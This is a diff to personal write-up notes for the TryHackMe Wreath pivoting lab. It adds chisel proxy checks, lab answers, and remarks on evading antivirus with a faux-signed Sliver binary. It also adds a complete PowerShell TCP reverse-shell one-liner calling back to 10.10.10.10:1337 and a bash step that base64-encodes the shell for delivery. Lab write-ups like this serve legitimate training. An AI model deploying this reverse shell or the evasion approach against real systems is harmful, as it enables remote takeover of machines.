@@ -26,7 +26,7 @@ Beyond Root:
 - Do the report like a professional
 - Prep reporting for further Offsec certs 2023!
 - Better  proxychains portscanning or more stealthier / elegant ways  to postscan internal networks. 
-
+- BestInSlot CS for myself for copy and paste
 
 - [[Wreath-Notes.md]]
 - [[Wreath-CMD-by-CMDs.md]]
@@ -521,11 +521,13 @@ print r.text.encode(sys.stdout.encoding, errors='replace')
 Proof my chisel proxy is up and hitting the right IP and port
 ![](curlingthorughthechisel.png)
 
-
+It is working!!
 ![](exploitthegitstack.png)
 
+For the answers
 ![](gitservoclock.png)
 
+more answers...
 ![](systeminfothroughthetunnel.png)
 
 CentOS has a restrictive always-on wrapper arount  `iptables` called `firewalld` 
@@ -552,17 +554,33 @@ How many make it to the waiting listener?
 ```
 #### Task 21 Git Server Stabilisation & Post Exploitation
 
+I really wanted to do a more elegant way of compromising the box than just adding a new user. A new user would be great from the perspective of managing multiple users on THM, but not for OPSEC. 
+
+Given the simple solution of just Scarecrowing-non-shitnowge-tme-avnoevado Silver binary that is faux-signed by Microsoft to bypass AV. I also would like to try something else.
+
+I also need to relay back to my Silver Server and another listener for the safety line of multiple shells.
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+He then base64, lttle endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
+```bash
+iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
+```
+
+
+![](givingintosocatrelayage.png)
 
 ## C2 Choices Diverge...
 
-From this point I will use silver instead of PowerShell Empire here are the answers.
+From this point I will use have already started using Silver instead of PowerShell Empire here are the answers.
 #### Task 24 Command and Control Empire: Overview
 
 Can we get an agent back from the git server directly (Aye/Nay)?
 ```
 Nay
 ```
-
 #### Task 27 Command and Control Empire: Agents
 
 Using the `help` command for guidance: in Empire CLI, how would we run the `whoami` command inside an agent?
